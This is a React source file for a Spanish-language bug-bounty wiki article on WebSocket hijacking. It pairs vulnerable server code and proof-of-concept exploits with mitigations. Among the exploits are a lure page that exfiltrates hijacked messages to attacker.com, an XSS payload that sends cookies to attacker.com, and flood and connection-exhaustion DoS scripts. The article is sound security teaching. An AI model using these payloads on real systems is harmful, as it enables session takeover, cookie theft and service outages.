/**
 * WEBSOCKET HIJACKING
 * Explotar WebSockets sin autenticación
 */

import { ReactNode } from 'react';
import {
  Section,
  Subsection,
  Paragraph,
  Strong,
  InlineCode,
  AlertInfo,
  AlertWarning,
  AlertDanger,
  AlertTip,
  CodeBlock,
  TerminalOutput,
  HighlightBox,
  ListItem
} from '@/components/WikiArticleComponents';
import { Globe, Shield, Lock, AlertTriangle, ArrowRight } from 'lucide-react';
import Link from 'next/link';

interface ArticleContentProps {
  locale: string;
}

export default function WebSocketHijackingContent({ locale }: ArticleContentProps): ReactNode {
  return (
    <>
      <Section id="introduccion" title="WebSocket Hijacking - CSRF en Tiempo Real">
        <Paragraph>
          <Strong>WebSocket Hijacking</Strong> explota conexiones WebSocket sin autenticación adecuada 
          para ejecutar acciones maliciosas, interceptar mensajes, y bypassear protecciones CSRF/SameSite.
        </Paragraph>

        <AlertDanger title="Impacto de WebSocket Hijacking">
          <ul className="mt-2 space-y-1">
            <ListItem>💬 Interceptar mensajes en chat en tiempo real</ListItem>
            <ListItem>🎮 Controlar sesión de usuario en aplicación</ListItem>
            <ListItem>📊 Inyectar datos maliciosos en stream</ListItem>
            <ListItem>🔐 Bypass de CSRF/SameSite protections</ListItem>
            <ListItem>⚡ Manipular trading orders, game actions</ListItem>
          </ul>
        </AlertDanger>
      </Section>

      <Section id="websocket-basics" title="1. WebSocket - Cómo Funciona">
        <CodeBlock
          language="javascript"
          title="Cliente establece conexión WebSocket"
          code={`// Cliente (JavaScript)
const ws = new WebSocket('wss://victim.com/ws');

ws.onopen = () => {
  console.log('Connected');
  
  // Enviar mensaje
  ws.send(JSON.stringify({
    type: 'chat',
    message: 'Hello'
  }));
};

ws.onmessage = (event) => {
  const data = JSON.parse(event.data);
  console.log('Received:', data);
};`}
        />

        <CodeBlock
          language="http"
          title="Handshake HTTP → WebSocket upgrade"
          code={`GET /ws HTTP/1.1
Host: victim.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Origin: https://victim.com
Cookie: session=abc123

HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=

# Ahora conexión bidireccional establecida
# Mensajes en tiempo real sin HTTP headers ✓`}
        />

        <AlertInfo>
          WebSocket handshake es HTTP, pero luego cambia a protocolo binario. 
          Cookies son enviadas en handshake inicial.
        </AlertInfo>
      </Section>

      <Section id="sin-autenticacion" title="2. WebSocket Sin Autenticación">
        <CodeBlock
          language="javascript"
          title="❌ VULNERABLE - Sin verificar Origin ni cookies"
          code={`// Servidor Node.js con ws library
const WebSocket = require('ws');
const wss = new WebSocket.Server({ port: 8080 });

wss.on('connection', (ws, req) => {
  // ❌ Sin verificar:
  // - Origin header
  // - Cookies de sesión
  // - Token de autenticación
  
  console.log('New connection');
  
  ws.on('message', (message) => {
    const data = JSON.parse(message);
    
    // ❌ Procesar mensajes sin validar autenticación
    if (data.type === 'transfer') {
      processTransfer(data.amount, data.to);
    }
  });
});

// Cualquiera puede conectar y enviar mensajes ✓`}
        />

        <CodeBlock
          language="html"
          title="Exploit - Conectar desde attacker.com"
          code={`<!DOCTYPE html>
<html>
<body>
  <h1>WebSocket Hijacking PoC</h1>
  
  <script>
    // Conectar a WebSocket vulnerable desde attacker.com
    const ws = new WebSocket('wss://victim.com/ws');
    
    ws.onopen = () => {
      console.log('[+] Connected to victim.com WebSocket');
      
      // Enviar mensaje malicioso
      ws.send(JSON.stringify({
        type: 'transfer',
        amount: 10000,
        to: 'attacker-account'
      }));
      
      console.log('[+] Malicious message sent');
    };
    
    ws.onmessage = (event) => {
      // Interceptar respuestas
      console.log('[+] Received:', event.data);
    };
  </script>
</body>
</html>

<!-- Víctima visita attacker.com
Resultado: Transferencia ejecutada sin autenticación ✓
-->`}
        />
      </Section>

      <Section id="csrf-websocket" title="3. Cross-Site WebSocket Hijacking (CSWSH)">
        <Paragraph>
          Aunque WebSocket envía cookies en handshake, si servidor NO valida 
          <InlineCode>Origin</InlineCode> header, atacante puede establecer conexión 
          desde sitio malicioso.
        </Paragraph>

        <CodeBlock
          language="javascript"
          title="❌ VULNERABLE - Acepta cualquier Origin"
          code={`// Servidor valida cookies pero NO Origin
wss.on('connection', (ws, req) => {
  // Verificar cookie de sesión
  const cookies = parseCookies(req.headers.cookie);
  const session = validateSession(cookies.session);
  
  if (!session) {
    ws.close(4001, 'Unauthorized');
    return;
  }
  
  // ❌ NO verifica Origin header
  // Atacante puede conectar si víctima tiene sesión válida
  
  ws.userId = session.userId;
  
  ws.on('message', (message) => {
    // Procesar mensajes autenticados
    handleMessage(ws.userId, message);
  });
});`}
        />

        <CodeBlock
          language="html"
          title="Exploit - CSWSH desde attacker.com"
          code={`<!DOCTYPE html>
<html>
<body>
  <h1>Win a Free iPhone! 🎁</h1>
  
  <script>
    // Atacante conecta a WebSocket de victim.com
    // Navegador envía cookies automáticamente en handshake
    const ws = new WebSocket('wss://victim.com/ws');
    
    ws.onopen = () => {
      console.log('[+] Hijacked WebSocket connection');
      
      // Ahora atacante puede:
      
      // 1. Enviar mensajes como la víctima
      ws.send(JSON.stringify({
        type: 'chat',
        to: 'public-channel',
        message: 'Click here for free money: https://phishing.com'
      }));
      
      // 2. Leer mensajes de la víctima
      ws.onmessage = (event) => {
        const data = JSON.parse(event.data);
        
        // Exfiltrar mensajes privados
        fetch('https://attacker.com/steal', {
          method: 'POST',
          body: JSON.stringify(data)
        });
      };
      
      // 3. Ejecutar acciones sensibles
      ws.send(JSON.stringify({
        type: 'updateProfile',
        email: 'attacker@evil.com'
      }));
    };
  </script>
</body>
</html>

<!-- Víctima visita attacker.com mientras logged in victim.com
Conexión WebSocket establecida con cookies de víctima
Atacante controla la sesión WebSocket ✓
-->`}
        />
      </Section>

      <Section id="message-injection" title="4. WebSocket Message Injection">
        <CodeBlock
          language="javascript"
          title="Servidor vulnerable a injection"
          code={`// Servidor de chat en tiempo real
wss.on('connection', (ws, req) => {
  ws.on('message', (message) => {
    const data = JSON.parse(message);
    
    // ❌ Sin sanitización - Broadcast a todos los clientes
    wss.clients.forEach((client) => {
      if (client.readyState === WebSocket.OPEN) {
        client.send(JSON.stringify({
          user: data.user,
          message: data.message  // ← Sin sanitizar
        }));
      }
    });
  });
});`}
        />

        <CodeBlock
          language="html"
          title="Cliente renderiza mensajes sin escape"
          code={`<!-- ❌ VULNERABLE - innerHTML con data sin sanitizar -->
<div id="chat"></div>

<script>
  const ws = new WebSocket('wss://victim.com/chat');
  
  ws.onmessage = (event) => {
    const data = JSON.parse(event.data);
    
    // ❌ Renderizar con innerHTML
    const chatDiv = document.getElementById('chat');
    chatDiv.innerHTML += \`
      <div>
        <strong>\${data.user}</strong>: \${data.message}
      </div>
    \`;
  };
</script>

<!-- Atacante envía mensaje con XSS payload: -->
<script>
ws.send(JSON.stringify({
  user: 'Attacker',
  message: '<img src=x onerror="fetch(\\'https://attacker.com/steal?c=\\'+document.cookie)">'
}));
</script>

<!-- Mensaje broadcast a TODOS los usuarios conectados
Cada usuario ejecuta XSS → Cookies robadas ✓
Stored XSS que afecta múltiples usuarios simultáneamente
-->`}
        />
      </Section>

      <Section id="bypass-samesite" title="5. WebSocket Bypass de SameSite Cookies">
        <Paragraph>
          WebSocket connections NO respetan <InlineCode>SameSite</InlineCode> cookie attribute. 
          Cookies son enviadas incluso con <InlineCode>SameSite=Strict</InlineCode>.
        </Paragraph>

        <CodeBlock
          language="javascript"
          title="Cookie con SameSite=Strict (inefectivo para WebSocket)"
          code={`// Servidor setea cookie con protección máxima
res.cookie('session', token, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict'  // ← NO previene WebSocket CSRF
});

// ❌ Cookie ES enviada en WebSocket handshake cross-site
// Aunque sea SameSite=Strict`}
        />

        <CodeBlock
          language="html"
          title="Exploit - SameSite bypass via WebSocket"
          code={`<!-- Desde attacker.com: -->
<script>
  // Navegador envía cookies INCLUSO con SameSite=Strict
  const ws = new WebSocket('wss://victim.com/ws');
  
  ws.onopen = () => {
    // Cookie session con SameSite=Strict fue enviada ✓
    
    ws.send(JSON.stringify({
      action: 'transfer',
      amount: 10000,
      to: 'attacker'
    }));
  };
</script>

<!-- SameSite=Strict previene:
✓ POST requests cross-site
✓ Cookies en <form> cross-site
✗ WebSocket connections (cookies enviadas)
-->`}
        />
      </Section>

      <Section id="token-leak" title="6. WebSocket Token Leakage">
        <CodeBlock
          language="javascript"
          title="Token en query string (INSEGURO)"
          code={`// ❌ VULNERABLE - Token en URL
const token = localStorage.getItem('authToken');
const ws = new WebSocket(\`wss://victim.com/ws?token=\${token}\`);

// Problemas:
// 1. Token visible en logs del servidor
// 2. Token en browser history
// 3. Token puede leakear via Referer
// 4. Token en network monitoring tools`}
        />

        <CodeBlock
          language="html"
          title="Leak de token via Referer"
          code={`<!-- Si página con WebSocket tiene link externo: -->
<a href="https://attacker.com">Click here</a>

<!-- Cuando usuario hace clic:
GET / HTTP/1.1
Host: attacker.com
Referer: wss://victim.com/ws?token=abc123secrettoken

Atacante captura token desde Referer ✓
-->`}
        />
      </Section>

      <Section id="dos-amplification" title="7. WebSocket DoS - Resource Exhaustion">
        <CodeBlock
          language="javascript"
          title="Flood attack - Enviar mensajes masivos"
          code={`// Atacante conecta y envía miles de mensajes
const ws = new WebSocket('wss://victim.com/ws');

ws.onopen = () => {
  // Enviar 10,000 mensajes por segundo
  setInterval(() => {
    for (let i = 0; i < 10000; i++) {
      ws.send(JSON.stringify({
        type: 'chat',
        message: 'A'.repeat(10000)  // 10KB por mensaje
      }));
    }
  }, 1000);
};

// Sin rate limiting:
// - Servidor agotado (CPU, memoria, bandwidth)
// - Broadcast a todos los clientes (amplificación)
// - DoS de toda la aplicación ✓`}
        />

        <CodeBlock
          language="javascript"
          title="Connection exhaustion - Abrir miles de conexiones"
          code={`// Atacante abre múltiples conexiones
for (let i = 0; i < 10000; i++) {
  const ws = new WebSocket('wss://victim.com/ws');
  
  ws.onopen = () => {
    // Mantener conexión abierta sin cerrar
    console.log(\`Connection \${i} established\`);
  };
}

// Sin límite de conexiones por IP:
// - 10,000 conexiones concurrentes
// - Recursos del servidor agotados
// - Usuarios legítimos no pueden conectar ✓`}
        />
      </Section>

      <Section id="mitigacion" title="Mitigación Completa">
        <AlertDanger title="✅ WebSocket Seguro">
          Implementar autenticación, validación de Origin, y rate limiting.
        </AlertDanger>

        <Subsection title="1. Validar Origin Header">
          <CodeBlock
            language="javascript"
            title="✅ SEGURO - Verificar Origin en handshake"
            code={`const WebSocket = require('ws');
const wss = new WebSocket.Server({ noServer: true });

const ALLOWED_ORIGINS = [
  'https://victim.com',
  'https://app.victim.com'
];

// Hook en HTTP upgrade request
server.on('upgrade', (request, socket, head) => {
  const origin = request.headers.origin;
  
  // ✅ Validar Origin
  if (!ALLOWED_ORIGINS.includes(origin)) {
    socket.write('HTTP/1.1 403 Forbidden\\r\\n\\r\\n');
    socket.destroy();
    return;
  }
  
  // Origin válido → Continuar con handshake
  wss.handleUpgrade(request, socket, head, (ws) => {
    wss.emit('connection', ws, request);
  });
});`}
          />
        </Subsection>

        <Subsection title="2. Autenticación con Tokens">
          <CodeBlock
            language="javascript"
            title="✅ SEGURO - Token en primer mensaje (no URL)"
            code={`// Cliente envía token en PRIMER mensaje
const ws = new WebSocket('wss://victim.com/ws');

ws.onopen = () => {
  const token = localStorage.getItem('authToken');
  
  // ✅ Enviar token en mensaje (no URL)
  ws.send(JSON.stringify({
    type: 'auth',
    token: token
  }));
};

// Servidor valida token
wss.on('connection', (ws, req) => {
  let authenticated = false;
  let authTimeout;
  
  // ✅ Timeout - Cliente debe autenticar en 5 segundos
  authTimeout = setTimeout(() => {
    if (!authenticated) {
      ws.close(4001, 'Authentication timeout');
    }
  }, 5000);
  
  ws.on('message', (message) => {
    const data = JSON.parse(message);
    
    if (!authenticated) {
      // ✅ Primer mensaje DEBE ser autenticación
      if (data.type !== 'auth') {
        ws.close(4002, 'Authentication required');
        return;
      }
      
      // Validar token
      const user = validateToken(data.token);
      if (!user) {
        ws.close(4003, 'Invalid token');
        return;
      }
      
      // Autenticación exitosa
      authenticated = true;
      ws.userId = user.id;
      clearTimeout(authTimeout);
      
      ws.send(JSON.stringify({ type: 'auth_success' }));
      return;
    }
    
    // Procesar mensajes normales (ya autenticado)
    handleMessage(ws.userId, data);
  });
});`}
          />
        </Subsection>

        <Subsection title="3. Rate Limiting">
          <CodeBlock
            language="javascript"
            title="✅ Limitar mensajes por conexión"
            code={`wss.on('connection', (ws, req) => {
  const messageQueue = [];
  const MAX_MESSAGES_PER_SECOND = 10;
  const MAX_MESSAGE_SIZE = 10000;  // 10KB
  
  ws.on('message', (message) => {
    // ✅ Verificar tamaño del mensaje
    if (message.length > MAX_MESSAGE_SIZE) {
      ws.close(4004, 'Message too large');
      return;
    }
    
    // ✅ Rate limiting
    const now = Date.now();
    messageQueue.push(now);
    
    // Remover mensajes más antiguos de 1 segundo
    while (messageQueue.length > 0 && messageQueue[0] < now - 1000) {
      messageQueue.shift();
    }
    
    // ✅ Verificar rate limit
    if (messageQueue.length > MAX_MESSAGES_PER_SECOND) {
      ws.close(4005, 'Rate limit exceeded');
      return;
    }
    
    // Procesar mensaje
    handleMessage(message);
  });
});`}
          />
        </Subsection>

        <Subsection title="4. Limitar Conexiones por IP">
          <CodeBlock
            language="javascript"
            title="✅ Prevenir connection exhaustion"
            code={`const connectionsByIP = new Map();
const MAX_CONNECTIONS_PER_IP = 5;

server.on('upgrade', (request, socket, head) => {
  // Obtener IP del cliente
  const ip = request.headers['x-forwarded-for'] || 
             request.socket.remoteAddress;
  
  // ✅ Verificar conexiones existentes
  const connections = connectionsByIP.get(ip) || 0;
  
  if (connections >= MAX_CONNECTIONS_PER_IP) {
    socket.write('HTTP/1.1 429 Too Many Connections\\r\\n\\r\\n');
    socket.destroy();
    return;
  }
  
  // Incrementar contador
  connectionsByIP.set(ip, connections + 1);
  
  wss.handleUpgrade(request, socket, head, (ws) => {
    // Decrementar cuando cierra
    ws.on('close', () => {
      const count = connectionsByIP.get(ip) - 1;
      if (count <= 0) {
        connectionsByIP.delete(ip);
      } else {
        connectionsByIP.set(ip, count);
      }
    });
    
    wss.emit('connection', ws, request);
  });
});`}
          />
        </Subsection>

        <Subsection title="5. Sanitizar Mensajes">
          <CodeBlock
            language="javascript"
            title="✅ Sanitizar antes de broadcast"
            code={`const DOMPurify = require('isomorphic-dompurify');

wss.on('connection', (ws) => {
  ws.on('message', (message) => {
    const data = JSON.parse(message);
    
    if (data.type === 'chat') {
      // ✅ Sanitizar HTML
      const cleanMessage = DOMPurify.sanitize(data.message, {
        ALLOWED_TAGS: [],  // Strip ALL HTML
        ALLOWED_ATTR: []
      });
      
      // Broadcast mensaje limpio
      wss.clients.forEach((client) => {
        if (client.readyState === WebSocket.OPEN) {
          client.send(JSON.stringify({
            user: data.user,
            message: cleanMessage
          }));
        }
      });
    }
  });
});`}
          />

          <CodeBlock
            language="javascript"
            title="✅ Cliente renderiza con textContent"
            code={`// ✅ SEGURO - Usar textContent (no innerHTML)
ws.onmessage = (event) => {
  const data = JSON.parse(event.data);
  
  const messageDiv = document.createElement('div');
  const userSpan = document.createElement('strong');
  
  // ✅ textContent previene XSS
  userSpan.textContent = data.user;
  
  const messageText = document.createTextNode(': ' + data.message);
  
  messageDiv.appendChild(userSpan);
  messageDiv.appendChild(messageText);
  
  document.getElementById('chat').appendChild(messageDiv);
};`}
          />
        </Subsection>

        <Subsection title="6. Timeout de Conexión Inactiva">
          <CodeBlock
            language="javascript"
            title="✅ Cerrar conexiones idle"
            code={`wss.on('connection', (ws) => {
  let lastActivity = Date.now();
  const IDLE_TIMEOUT = 5 * 60 * 1000;  // 5 minutos
  
  // ✅ Ping/pong para keep-alive
  const pingInterval = setInterval(() => {
    if (Date.now() - lastActivity > IDLE_TIMEOUT) {
      ws.close(4006, 'Idle timeout');
      clearInterval(pingInterval);
    } else {
      ws.ping();
    }
  }, 30000);  // Ping cada 30 segundos
  
  ws.on('pong', () => {
    lastActivity = Date.now();
  });
  
  ws.on('message', () => {
    lastActivity = Date.now();
  });
  
  ws.on('close', () => {
    clearInterval(pingInterval);
  });
});`}
          />
        </Subsection>

        <Subsection title="7. Logging y Monitoring">
          <CodeBlock
            language="javascript"
            title="✅ Detectar ataques en tiempo real"
            code={`wss.on('connection', (ws, req) => {
  const ip = req.socket.remoteAddress;
  const origin = req.headers.origin;
  
  // ✅ Log todas las conexiones
  logger.info('WebSocket connection', {
    ip,
    origin,
    userAgent: req.headers['user-agent']
  });
  
  ws.on('message', (message) => {
    // ✅ Detectar patrones sospechosos
    if (message.length > 50000) {
      logger.warn('Large message detected', { ip, size: message.length });
    }
    
    // ✅ Detectar flood
    if (messageQueue.length > MAX_MESSAGES_PER_SECOND * 0.8) {
      logger.warn('Approaching rate limit', { ip, count: messageQueue.length });
    }
  });
  
  ws.on('close', (code, reason) => {
    logger.info('WebSocket closed', { ip, code, reason });
  });
});`}
          />
        </Subsection>
      </Section>

      <div className="mt-12 pt-8 border-t border-slate-200 dark:border-slate-800">
        <h3 className="text-2xl font-bold text-slate-900 dark:text-white mb-4">Siguiente: HTTP Request Smuggling</h3>
        <Link
          href={`/${locale}/wiki/bug-bounty/http-request-smuggling`}
          className="group inline-flex items-center gap-3 px-6 py-4 bg-gradient-to-r from-orange-600 to-red-600 text-white rounded-xl font-semibold hover:shadow-xl hover:shadow-orange-500/50 transition-all"
        >
          <span>Explotar diferencias en parseo HTTP</span>
          <ArrowRight className="w-5 h-5 group-hover:translate-x-1 transition-transform" />
        </Link>
      </div>
    </>
  );
}
